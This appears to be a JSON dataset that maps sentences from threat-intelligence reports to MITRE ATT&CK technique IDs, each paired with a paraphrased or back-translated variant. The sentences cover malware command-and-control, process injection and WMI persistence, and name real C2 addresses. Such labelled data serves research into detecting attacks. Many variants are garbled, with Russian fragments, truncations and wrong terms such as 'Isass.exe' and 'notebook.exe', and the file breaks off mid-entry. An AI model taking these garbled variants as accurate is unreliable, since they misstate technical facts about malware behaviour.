    "These files are then transmitted to a threat actor, often over commonly open ports 80 and 443 (HTTP and HTTPS)": [
        {
            "tec_id": "T1571",
            "en_text": "These files are then transmitted to a threat actor, often over commonly open ports 80 and 443 (HTTP and HTTPS)",
            "data_text": "These files are then transferred to the threat actor, often through open ports 80 and 443 (HTTP and HTTPS)"
        }
    ],
    "Msoffice365cdn[.]com resolves to 80.82.79.221, which resides on the same class C network range as the IP resolution of office365-technical[.]info, which resolves to 80.82.79.240": [
        {
            "tec_id": "T1571",
            "en_text": "Msoffice365cdn[.]com resolves to 80.82.79.221, which resides on the same class C network range as the IP resolution of office365-technical[.]info, which resolves to 80.82.79.240",
            "data_text": "Msooffice365cdn[.]com is allowed up to 80.82,79,221, which is on the same class C network range as IP resolution office365-technic[.]info, which is allowed up to 80,82,79,240"
        }
    ],
    "SpyNote RAT builder The SpyNote Remote Access Trojan (RAT) builder is gaining popularity in the hacking community, so we decided to study its pervasiveness": [
        {
            "tec_id": "T1571",
            "en_text": "SpyNote RAT builder The SpyNote Remote Access Trojan (RAT) builder is gaining popularity in the hacking community, so we decided to study its pervasiveness",
            "data_text": "RAT developer SpyNote Trojan (RAT) creator of remote access SpyNote is becoming popular in the hacking community, so we decided to study its prevalence"
        }
    ],
    "KONNI is a RAT that is believed to have  been in use for over four years, with a wide array of functionalities, often leveraging free web hosting providers like 000webhost for its C2 infrastructure": [
        {
            "tec_id": "T1571",
            "en_text": "KONNI is a RAT that is believed to have  been in use for over four years, with a wide array of functionalities, often leveraging free web hosting providers like 000webhost for its C2 infrastructure",
            "data_text": "KONNI is a RAT that is believed to have been used for more than four years, with a wide range of features often using free web hosting providers such as 000webhosts for its C2 infrastructure"
        }
    ],
    "Command and control To traverse the firewall, C2 traffic for most TG-3390 tools occurs over ports 53, 80, and 443": [
        {
            "tec_id": "T1571",
            "en_text": "Command and control To traverse the firewall, C2 traffic for most TG-3390 tools occurs over ports 53, 80, and 443",
            "data_text": "Command and Control To switch over the firewall, C2 traffic for most TG-3390 tools occurs through ports 53, 80, and 443"
        }
    ],
    "Upon first execution of TONEDEAF, FireEye identified a callback to the C2 server offlineearthquake[.]com over port 80.": [],
    "The Metasploit reverse HTTP payload was configured to communicate with the command and control (C2) IP address 176.126.85[.]207 with a randomly named resource such as” over TCP port 443.": [
        {
            "tec_id": "T1571",
            "en_text": "The Metasploit reverse HTTP payload was configured to communicate with the command and control (C2) IP address 176.126.85[.]207 with a randomly named resource such as” over TCP port 443.",
            "data_text": "The song Metasploit only HTTP load was configured to communicate with the management and control (C2) IP address 176.126.85[.]207 with random named resources such as \" TCP port 443."
        }
    ],
    "The malware proceeds to connect to the C2 server at 5.189.145.248 at regular intervals through the use of TCP over port 10500": [
        {
            "tec_id": "T1571",
            "en_text": "The malware proceeds to connect to the C2 server at 5.189.145.248 at regular intervals through the use of TCP over port 10500",
            "data_text": "Malware continues to connect to server C2 at 5.189.145.248 at regular intervals using TCP over port 10500"
        }
    ],
    "1/12/14 3/5/14 127.0.0.1 N/A   3/5/14 3/31/14 103.24.0.142 Hong Kong   3/31/14 10/27/14 103.24.1.54 Hong Kong   10/27/14 11/9/14 127.0.0.1 N/A   11/9/14 5/25/15 127.0.0.3 N/A   5/25/15 Current as of this publication 127.0.0.1 N/A    Table 5": [
        {
            "tec_id": "T1571",
            "en_text": "1/12/14 3/5/14 127.0.0.1 N/A   3/5/14 3/31/14 103.24.0.142 Hong Kong   3/31/14 10/27/14 103.24.1.54 Hong Kong   10/27/14 11/9/14 127.0.0.1 N/A   11/9/14 5/25/15 127.0.0.3 N/A   5/25/15 Current as of this publication 127.0.0.1 N/A    Table 5",
            "data_text": "1/12/14 3/5/14 127.0.0.1 N/A 3/5/14 3/31/14 103.24.0.142 Hong Kong 3/31/14 10/27/14 103.24.1.54 Hong Kong 10/27/14 11/9/14 127.0.0.1 N/A 11/9/14 5/25/15 127.0.3 N/A 5/25.0.3 N/A 5/25.0.15 Current information about this publication"
        }
    ],
    "This version injects a malicious module into one of Avast's processes, whereas early versions of the campaign detected Avast and quit": [
        {
            "tec_id": "T1055",
            "en_text": "This version injects a malicious module into one of Avast's processes, whereas early versions of the campaign detected Avast and quit",
            "data_text": "This version introduces a malicious module into one of the Avast processes, while early versions of the campaign detected Avast and logged out."
        }
    ],
    "On execution, the tool injects itself into lsass.exe and is triggered with the argument “dig”": [
        {
            "tec_id": "T1055",
            "en_text": "On execution, the tool injects itself into lsass.exe and is triggered with the argument “dig”",
            "data_text": "When executed, the tool is entered into Isass.exe and is started with the argument \"dig\""
        }
    ],
    "Figure 5 shows Phishery’s output to the command that injects a URL into a file named “good_test.docx”, which it will save the resulting file to “bad_test.docx”": [
        {
            "tec_id": "T1055",
            "en_text": "Figure 5 shows Phishery’s output to the command that injects a URL into a file named “good_test.docx”, which it will save the resulting file to “bad_test.docx”",
            "data_text": "Figure 5 shows Fisher's output to a command that enters the URL into a file called \"good_test.docx\" that stores the result in \"bad_test.docx\""
        }
    ],
    "It is capable of the following functions:  Collect file/folder/drive information Download files and additional malware Launch/terminate/enumerate process Update configuration data Delete files Inject code from files to other running process Utilize proxy Open reverse shell Run in passive mode — instead of actively connecting to the command and control (C&C) server, the backdoor will open and listen to a port then receive commands through it  Once the backdoor is loaded, it will then load the encrypted configuration file Auditcred.dll.mui/rOptimizer.dll.mui to extract the C&C information and connect to it": [
        {
            "tec_id": "T1055",
            "en_text": "It is capable of the following functions:  Collect file/folder/drive information Download files and additional malware Launch/terminate/enumerate process Update configuration data Delete files Inject code from files to other running process Utilize proxy Open reverse shell Run in passive mode — instead of actively connecting to the command and control (C&C) server, the backdoor will open and listen to a port then receive commands through it  Once the backdoor is loaded, it will then load the encrypted configuration file Auditcred.dll.mui/rOptimizer.dll.mui to extract the C&C information and connect to it",
            "data_text": "In this case, you can get file/folder/disk information Download files and additional malware Run/Term/Upgrade process configuration data Delete the code input files from the files to another running process Use proxy Reverse shell Run in passive mode—instead of active command and control connection (CAP)."
        }
    ],
    "As a result of all these steps, the last-stage Trojan is injected into svchost.exe’s process memory": [
        {
            "tec_id": "T1055",
            "en_text": "As a result of all these steps, the last-stage Trojan is injected into svchost.exe’s process memory",
            "data_text": "As a result of all these steps, the last stage Trojan is entered into svchost.exe process memory"
        }
    ],
    "Process injection helps the malware avoid detection; however, review of active network connections show notepad.exe communicating to 185": [
        {
            "tec_id": "T1055",
            "en_text": "Process injection helps the malware avoid detection; however, review of active network connections show notepad.exe communicating to 185",
            "data_text": "Injecting the process helps the malware avoid detection; however, an overview of active network connections shows notebook.exe communicating with 185"
        }
    ],
    "This shellcode injects the final payload taken from the resource section into the original RegAsm.exe process": [
        {
            "tec_id": "T1055",
            "en_text": "This shellcode injects the final payload taken from the resource section into the original RegAsm.exe process",
            "data_text": "This shellcode inserts the final payload taken from the resource partition into the original RegAsm.exe process"
        }
    ],
    "Traps 4.0 can be configured to protect the processes that are cited as being abused in this blog from loading malicious code": [
        {
            "tec_id": "T1055",
            "en_text": "Traps 4.0 can be configured to protect the processes that are cited as being abused in this blog from loading malicious code",
            "data_text": "Traps 4.0 can be configured to protect processes that are cited as being abused in this blog from malicious code downloads"
        }
    ],
    "Injects ma32.dll into “wwahost.exe” or “audacity.exe”": [
        {
            "tec_id": "T1055",
            "en_text": "Injects ma32.dll into “wwahost.exe” or “audacity.exe”",
            "data_text": "Type ma32.dll in \"wwahost.exe\" or \"audacity.exe\""
        }
    ],
    "05 27 28 obj32.bin obj32.bin obj64.bin Shellcode template is used by Reinstaller/Injector (rsXX.dll) and AudioRecorder4MetroApp (meXX.dll) for injecting into running processes": [
        {
            "tec_id": "T1055",
            "en_text": "05 27 28 obj32.bin obj32.bin obj64.bin Shellcode template is used by Reinstaller/Injector (rsXX.dll) and AudioRecorder4MetroApp (meXX.dll) for injecting into running processes",
            "data_text": "05 27 28 obj32.bin obj32.bin obj64.bin Shellcode template is used by Reinstaller/Injector (rsXX.dll) and AudioRecorder4MetroApp (meXX.dll) to inject into running processes"
        }
    ],
    "Pupy can communicate using multiple transports, migrate into processes using reflective injection, and load remote python code, python packages and python C-extensions from memory": [
        {
            "tec_id": "T1055",
            "en_text": "Pupy can communicate using multiple transports, migrate into processes using reflective injection, and load remote python code, python packages and python C-extensions from memory",
            "data_text": "Pupy can communicate with multiple vehicles, migrate to processes using reflective injection and download remote Python code, Python packages and Python C extensions from memory"
        }
    ],
    "Meanwhile, injection and delivery techniques are undergoing changes in 2018 with reflective loaders and code enhancements": [
        {
            "tec_id": "T1055",
            "en_text": "Meanwhile, injection and delivery techniques are undergoing changes in 2018 with reflective loaders and code enhancements",
            "data_text": "Meanwhile, reflective loaders and code enhancements are changing in 2018 during the injection and delivery process."
        }
    ],
    "2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = “UserCache.dll“) 9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = “UserCache.dll“) The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time": [
        {
            "tec_id": "T1055",
            "en_text": "2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = “UserCache.dll“) 9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = “UserCache.dll“) The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time",
            "data_text": "2e0361fd73f60c76c69806205307ccac, update.dll (miniduke), 425kb (internal name = \"UserCache.dll\") 9e3f3b5e9ce79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb -internal user name \"external\""
        }
    ],
    "*Command_Create&Inject:  This command creates a new process (using a supplied filename as the process name) and then injects malicious code into it": [
        {
            "tec_id": "T1055",
            "en_text": "*Command_Create&Inject:  This command creates a new process (using a supplied filename as the process name) and then injects malicious code into it",
            "data_text": "*Command_Create"
        }
    ],
    "64)   u= {B5B70BD7-87FC-499A-B4D1- 98163306F0D8} A GUID   r= 1 Boolean value if the malware is running as injected code   t= 8035187 Number of milliseconds the computer has been running    Table 3": [
        {
            "tec_id": "T1055",
            "en_text": "64)   u= {B5B70BD7-87FC-499A-B4D1- 98163306F0D8} A GUID   r= 1 Boolean value if the malware is running as injected code   t= 8035187 Number of milliseconds the computer has been running    Table 3",
            "data_text": "64) u= {B5B70BD7-87FC-499A-B4D1- 98163306F0D8} BASIC r= 1 Boolean value if malware is running as injection code t= 8035187 Number of milliseconds the computer is running Table 3"
        }
    ],
    "The loader will then inject a DLL backdoor into dllhost.exe": [
        {
            "tec_id": "T1055",
            "en_text": "The loader will then inject a DLL backdoor into dllhost.exe",
            "data_text": "The bootloader enters DLL discovery in dllhost.exe"
        }
    ],
    "FakeRun’s PDB string (D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process": [
        {
            "tec_id": "T1055",
            "en_text": "FakeRun’s PDB string (D:\\Work\\Project\\VS\\house\\Apple\\Apple_20180115\\Release\\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process",
            "data_text": "The PDB FakeRun (D:Работа/Проект/СИ \" дом\\Яблоко\\Яблоко_20180115\\Отпуск\\FakeRun.pdb) the boot loader as dllhost.exe in this process one malicious file is particularly important, which is the back."
        }
    ],
    "TClient is injected into dllhost.exe Malware Analysis  wab32res.dll (FakeRun loader) loads TClient": [
        {
            "tec_id": "T1055",
            "en_text": "TClient is injected into dllhost.exe Malware Analysis  wab32res.dll (FakeRun loader) loads TClient",
            "data_text": "TClient entered in dllhost.exe Malware Analysis wab32res.dll (FakeRun loader) downloads TClient"
        }
    ],
    "Successfully checking the loader will execute the dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as there can be multiple instances of it depending on the number of programs using the Internet Information Services": [
        {
            "tec_id": "T1055",
            "en_text": "Successfully checking the loader will execute the dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as there can be multiple instances of it depending on the number of programs using the Internet Information Services",
            "data_text": "Successful boot loader verification will run the dllhost.exe process and create a hard code mutex to avoid entering it into the wrong dllhost.exe, as there may be multiple instances of it depending on the number of programs using Internet Information Services."
        }
    ],
    "20 New processes The malicious svchost constantly queries ieframe.dll, as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components to interact with Internet Explorer": [
        {
            "tec_id": "T1055",
            "en_text": "20 New processes The malicious svchost constantly queries ieframe.dll, as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components to interact with Internet Explorer",
            "data_text": "20 new processes malicious svchost constantly requests iframe.dll as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components for interacting with Internet Explorer"
        }
    ],
    "Figure 2: De-obfuscated code scheduling the second task to run a script embedded in a blog page The last section of script embedded in 29[.]html then downloads Revenge RAT and injects the binary into the memory of a running process, as seen in Figure 3": [
        {
            "tec_id": "T1055",
            "en_text": "Figure 2: De-obfuscated code scheduling the second task to run a script embedded in a blog page The last section of script embedded in 29[.]html then downloads Revenge RAT and injects the binary into the memory of a running process, as seen in Figure 3",
            "data_text": "Figure 2 : Деобфушированный the code, планирующий the second to start the script, built in blog page.The last part of the scenario, built in 29 [.), then uploads Revenge RAT and a binary file into memory running process, as you can see in Figure 3...."
        }
    ],
    "The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command": [
        {
            "tec_id": "T1055",
            "en_text": "The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command",
            "data_text": "The encoded payload was Httpstager Cobalt Strike, which was introduced into the PowerShell process that ran the command"
        }
    ],
    "After finding the process id, the shellcode uses standard functions to allocate and write memory within Explorer and then uses low-level API RtlCreateUserThread for thread injection.": [
        {
            "tec_id": "T1055",
            "en_text": "After finding the process id, the shellcode uses standard functions to allocate and write memory within Explorer and then uses low-level API RtlCreateUserThread for thread injection.",
            "data_text": "After searching for a process ID, shellcode uses standard functions to allocate and write memory in Explorer, and then uses the low-level RtlCreateUserThread API to inject threads."
        }
    ],
    "It’s also used to inject code into its target processes using the technique.": [
        {
            "tec_id": "T1055",
            "en_text": "It’s also used to inject code into its target processes using the technique.",
            "data_text": "It is also used to inject code into target processes using technology."
        }
    ],
    "wmic.exe is a powerful, native Windows command line utility used to interact with Windows Management Instrumentation (WMI)": [
        {
            "tec_id": "T1047",
            "en_text": "wmic.exe is a powerful, native Windows command line utility used to interact with Windows Management Instrumentation (WMI)",
            "data_text": "wmic.exe is a powerful Windows command-line utility used to interact with Windows Management Engine (WMI)"
        }
    ],
    "This utility is able to execute complicated WQL queries and WMI methods": [
        {
            "tec_id": "T1047",
            "en_text": "This utility is able to execute complicated WQL queries and WMI methods",
            "data_text": "This utility is capable of performing complex WQL queries and WMI methods"
        }
    ],
    "Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information": [
        {
            "tec_id": "T1047",
            "en_text": "Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information",
            "data_text": "Instead of using the systeminfo and tasklist commands, option C# Zebrocy uses WMI queries to gather this information."
        }
    ],
    "POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI)": [
        {
            "tec_id": "T1047",
            "en_text": "POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI)",
            "data_text": "POSHSPY uses two of the tools that are often used by the PowerShell group and the Windows Management Device (WMI)"
        }
    ],
    "POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI": [
        {
            "tec_id": "T1047",
            "en_text": "POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI",
            "data_text": "Using POSHSPY WMI to store and save backdoor code makes it almost invisible to anyone unfamiliar with WMI subtleties"
        }
    ],
    "Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000": [
        {
            "tec_id": "T1047",
            "en_text": "Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000",
            "data_text": "Windows Management Instrumentation WMI is an administrative base that has been integrated into every version of Windows since 2000."
        }
    ],
    "WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell": [
        {
            "tec_id": "T1047",
            "en_text": "WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell",
            "data_text": "WMI access can be accessed using a variety of tools, including the Windows WMI command line (wmic.exe), or through APIs available for programming languages and scripts such as PowerShell"
        }
    ],
    "Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\\wbem\\Repository directory": [
        {
            "tec_id": "T1047",
            "en_text": "Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\\wbem\\Repository directory",
            "data_text": "Windows system WMI data is stored in a WMI General Information Model (CIM) repository consisting of multiple files in the system32\\wbem\\Repository directory"
        }
    ],
    "WMI classes are the primary structure within WMI": [
        {
            "tec_id": "T1047",
            "en_text": "WMI classes are the primary structure within WMI",
            "data_text": "WMI classes are the main structure in WMI"
        }
    ],
    "WMI permanent event subscriptions can be used to trigger actions when specified conditions are met": [
        {
            "tec_id": "T1047",
            "en_text": "WMI permanent event subscriptions can be used to trigger actions when specified conditions are met",
            "data_text": "WMI persistent event subscriptions can be used to trigger actions when certain conditions are met."
        }
    ],
    "Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding": [
        {
            "tec_id": "T1047",
            "en_text": "Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding",
            "data_text": "Subscriptions consist of three main WMI classes: Filter, Consumer, and FilterToConsumerBinding"
        }
    ],
    "WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others": [
        {
            "tec_id": "T1047",
            "en_text": "WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others",
            "data_text": "WMI filters define the conditions that will prompt the consumer, including system startup, program execution, elapsed time, and many others."
        }
    ],
    "APT29 then created a WMI event subscription in order to execute the backdoor": [
        {
            "tec_id": "T1047",
            "en_text": "APT29 then created a WMI event subscription in order to execute the backdoor",
            "data_text": "APT29 then created a WMI event subscription to perform the backdoor"
        }
    ],
    "In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.     Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration": [
        {
            "tec_id": "T1047",
            "en_text": "In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.     Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration",
            "data_text": "In one case, APT29 created the BfeOnServiceStartTypeChange filter (Fig. 1)which they configured to run every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time. Figure 1: The BfeOnServiceStartTypeChange (WQL) filter was linked to CommandLineEventConsumer WindowsParentalControlsMigration"
        }
    ],
    "This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics": [
        {
            "tec_id": "T1047",
            "en_text": "This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics",
            "data_text": "This excellent paper by William Ballentin, Matt Graeber and Claudio Theodorescu contains additional information about the WMI attack, defense and forensic expertise."
        }
    ],
    "This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations": [
        {
            "tec_id": "T1047",
            "en_text": "This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations",
            "data_text": "This presentation by Christopher Gleyer and Devon Kerr provides additional information on the use of WMI attackers in past Mandant research."
        }
    ],
    "The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence.": [
        {
            "tec_id": "T1047",
            "en_text": "The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence.",
            "data_text": "The FireEye FLARE team has released a WMI repository parsing tool that allows researchers to extract embedded data from the WMI repository and determine WMI persistence."
        }
    ],
    "Initial triage begins with connecting to Windows Management Instrumentation (WMI) via the “ROOT\\CIMV2” namespace": [
        {
            "tec_id": "T1047",
            "en_text": "Initial triage begins with connecting to Windows Management Instrumentation (WMI) via the “ROOT\\CIMV2” namespace",
            "data_text": "Initial triage starts with connecting to Windows Management Instrumentation (WMI) via the namespace \"ROOT\\CIMV2\""
        }
    ],
    "The payload uses WMI queries and checks running processes for evidence that the script may be executing within an analysis environment": [
        {
            "tec_id": "T1047",
            "en_text": "The payload uses WMI queries and checks running processes for evidence that the script may be executing within an analysis environment",
            "data_text": "The Help field uses WMI queries and checks the running processes for evidence that the script can run in the analysis environment."
        }
    ],
    "Technique Description   Fan Check The Trojan will perform the following WMI query:   Select * from Win32_Fan   According to MSDN, this query should return a class that provides statistics on the CPU fan": [
        {
            "tec_id": "T1047",
            "en_text": "Technique Description   Fan Check The Trojan will perform the following WMI query:   Select * from Win32_Fan   According to MSDN, this query should return a class that provides statistics on the CPU fan",
            "data_text": "Fan Check Technique Description Trojan performs the following WMI request: Select * from Win32_Fan Per MSDN, this request should return a class that provides statistics on the processor fan"
        }
    ],
    "This suggests that other WMI-based VM detection techniques may also detect certain physical systems if those systems do not support the specific WMI query": [
        {
            "tec_id": "T1047",
            "en_text": "This suggests that other WMI-based VM detection techniques may also detect certain physical systems if those systems do not support the specific WMI query",
            "data_text": "This implies that other WMI-based VM discovery methods may also detect specific physical systems if these systems do not support a specific WMI request"
        }
    ],
    "Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality": [
        {
            "tec_id": "T1047",
            "en_text": "Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality",
            "data_text": "They may plan to tie this theft to another dropper that supports the WMI anti-AV feature"
        }
    ],
    "Leveraging Existing Windows Services to Deliver Malware Windows Management Instrumentation Console (WMIC) provides a command line interface to WMI": [
        {
            "tec_id": "T1047",
            "en_text": "Leveraging Existing Windows Services to Deliver Malware Windows Management Instrumentation Console (WMIC) provides a command line interface to WMI",
            "data_text": "Using existing Windows services to deliver Windows Management Instrumentation Console (WMIC) software provides a WMI command-line interface"
        }
    ],
    "WMIC is a good tool for managing windows hosts and is widely favored by desktop administrators": [
        {
            "tec_id": "T1047",
            "en_text": "WMIC is a good tool for managing windows hosts and is widely favored by desktop administrators",
            "data_text": "WMIC is a good tool for managing Windows hosts and is widely supported by desktop administrators"
        }
    ],
    "This is attack vector presents interesting problems, as blocking or restricting the use of WMIC may not be a feasible solution for some administrators": [
        {
            "tec_id": "T1047",
            "en_text": "This is attack vector presents interesting problems, as blocking or restricting the use of WMIC may not be a feasible solution for some administrators",
            "data_text": "This attack vector presents interesting problems as blocking or restricting WMIC usage may not be a possible solution for some administrators"
        }
    ],
    "Most of the PowerShell commands would call Windows Management Instrumentation (WMI)": [
        {
            "tec_id": "T1047",
            "en_text": "Most of the PowerShell commands would call Windows Management Instrumentation (WMI)",
            "data_text": "Most PowerShell commands will call Windows Management Instrumentation (WMI)"
        }
    ],
    "This location data gives the attacker a unique edge, as they can specify a target country or city to attack and maximize their accuracy when choosing a particular target.    The .txt file contains information about the C2 domain and infected machine, as detected in a Cybereason Lab environment": [
        {
            "tec_id": "T1041",
            "en_text": "This location data gives the attacker a unique edge, as they can specify a target country or city to attack and maximize their accuracy when choosing a particular target.    The .txt file contains information about the C2 domain and infected machine, as detected in a Cybereason Lab environment",
            "data_text": "Location data gives an attacker a unique edge as they can point to the country or city to be attacked and maximize their accuracy when choosing a specific target. The .txt file contains information about the C2 domain and infected machine detected in the Lab Cybereason environment"
        }
    ],
    "Malware  Capabilities  WINDSHIELD   Command and control (C2) communications via TCP raw sockets Four configured C2s and six configured ports – randomly-chosen C2/port for communications Registry manipulation Get the current module's file name Gather system information including registry values, user name, computer name, and current code page File system interaction including directory creation, file deletion, reading, and writing files Load additional modules and execute code Terminate processes Anti-disassembly   KOMPROGO   Fully-featured backdoor capable of process, file, and registry management Creating a reverse shell File transfers Running WMI queries Retrieving information about the infected system   SOUNDBITE   C2 communications via DNS Process creation File upload Shell command execution File and directory enumeration/manipulation Window enumeration Registry manipulation System information gathering   PHOREAL   C2 communications via ICMP Reverse shell creation Filesystem manipulation Registry manipulation Process creation File upload   BEACON (Cobalt Strike)   Publicly available payload that can inject and execute arbitrary code into processes Impersonating the security context of users Importing Kerberos tickets Uploading and downloading files Executing shell commands Configured with malleable C2 profiles to blend in with normal network traffic Co-deployment and interoperability with Metasploit framework SMB Named Pipe in-memory backdoor payload that enables peer-to-peer C2 and pivoting over SMB    Table 3: APT32 Malware and Capabilities APT32 operators appear to be well-resourced and supported as they use a large set of domains and IP addresses as command and control infrastructure": [
        {
            "tec_id": "T1041",
            "en_text": "Malware  Capabilities  WINDSHIELD   Command and control (C2) communications via TCP raw sockets Four configured C2s and six configured ports – randomly-chosen C2/port for communications Registry manipulation Get the current module's file name Gather system information including registry values, user name, computer name, and current code page File system interaction including directory creation, file deletion, reading, and writing files Load additional modules and execute code Terminate processes Anti-disassembly   KOMPROGO   Fully-featured backdoor capable of process, file, and registry management Creating a reverse shell File transfers Running WMI queries Retrieving information about the infected system   SOUNDBITE   C2 communications via DNS Process creation File upload Shell command execution File and directory enumeration/manipulation Window enumeration Registry manipulation System information gathering   PHOREAL   C2 communications via ICMP Reverse shell creation Filesystem manipulation Registry manipulation Process creation File upload   BEACON (Cobalt Strike)   Publicly available payload that can inject and execute arbitrary code into processes Impersonating the security context of users Importing Kerberos tickets Uploading and downloading files Executing shell commands Configured with malleable C2 profiles to blend in with normal network traffic Co-deployment and interoperability with Metasploit framework SMB Named Pipe in-memory backdoor payload that enables peer-to-peer C2 and pivoting over SMB    Table 3: APT32 Malware and Capabilities APT32 operators appear to be well-resourced and supported as they use a large set of domains and IP addresses as command and control infrastructure",
            "data_text": "4 of C2 and 6 of ports – to the C2/port for the management of the registry to obtain the name of the current module Сбор the information, including the registry, user name, name of the machine and the current page code ФайлыВзаимодействие to SVN, including catalog, removing files, reading and writing the files to download additional modules and the code to complete processes May.a KOMPROGO fully functional backdoor that can process, the file and реестраФункциональная system SOUNDBITE to Friday communication through the establishment of DNS processes : Download files the command line : Download files and folders перечисливание/манипуляция the Перечислительная information management system PHOREAL to Friday with the help of ICMP Reverse the system, BMP, TIFF formats, Манипуляц.and I'm not require the creation of files : BEACON (Cobalt Strike) of expanding the available useful, which can type and to execute arbitrary code to the processes of Impersoning the security context of users Importing directory tickets Upload and download file Executing to the Configured with maleable study profiles for mixing with normal network traffic Co-развертирование and интерoпроизводите.Reliability using the Metaploit SMB Named Pipe framework in memory payload that enables Peer-to-Peer C2 and swivel over SMB Table 3: APT32 Malware and Capabilities APT32 operators have good resources and are supported as they use a large set of domains and IP addresses as well as command-control infrastructure"
        }
    ],
    "The malware performs the following activities:  Builds imports by dynamically loading APIs Decrypts strings needed for control server communications Performs control server communications Handles commands issued by the control server Uninstalls self from the system  The malicious thread dynamically loads the APIs it needs at the beginning of its execution using LoadLibrary() and GetProcAddress()": [
        {
            "tec_id": "T1041",
            "en_text": "The malware performs the following activities:  Builds imports by dynamically loading APIs Decrypts strings needed for control server communications Performs control server communications Handles commands issued by the control server Uninstalls self from the system  The malicious thread dynamically loads the APIs it needs at the beginning of its execution using LoadLibrary() and GetProcAddress()",
            "data_text": "Malware performs the following steps: Creates an import by dynamically downloading the API Decrypts the strings required to manage server communications Executes the Handles server management commands issued by the management server Deletes itself from the system.()"
        }
    ],
    "In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim’s machine and the C2 server": [
        {
            "tec_id": "T1041",
            "en_text": "In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim’s machine and the C2 server",
            "data_text": "In response, if the condition is in order, TOKEN receives from the server C2 which is used to synchronize actions between the victim machine and the server C2."
        }
    ],
    "After obtaining the unique ID from the C2 server, the Trojan calls the “SetAbStatById” method to notify the C2 server of its status of “1” to notify the server it had successfully received the filename and file data": [
        {
            "tec_id": "T1041",
            "en_text": "After obtaining the unique ID from the C2 server, the Trojan calls the “SetAbStatById” method to notify the C2 server of its status of “1” to notify the server it had successfully received the filename and file data",
            "data_text": "After receiving a unique ID from the C2 server, the Trojan is called by the \"SetAbStatById\" method to inform the C2 server of its status \"1\" to inform the server that it has successfully obtained the file name and file data."
        }
    ],
    "The r1.log file stores information for exfiltration": [
        {
            "tec_id": "T1074",
            "en_text": "The r1.log file stores information for exfiltration",
            "data_text": "The r1.log file stores information for exfiltration"
        }
    ],
    "After Comnie has been copied to the %TEMP% directory, it will look for the presence of the ‘DQuit.tmp’ file in this path": [
        {
            "tec_id": "T1074",
            "en_text": "After Comnie has been copied to the %TEMP% directory, it will look for the presence of the ‘DQuit.tmp’ file in this path",
            "data_text": "After Comnie is copied to the %TEMP% directory, it will search for the presence of the 'DQuit.tmp' file in this path"
        }
    ],
    "FeedBack.php validates the sender by User-Agent, saves the data in the “RAR” server directory and stores the metadata in the mssql database for later reference": [
        {
            "tec_id": "T1074",
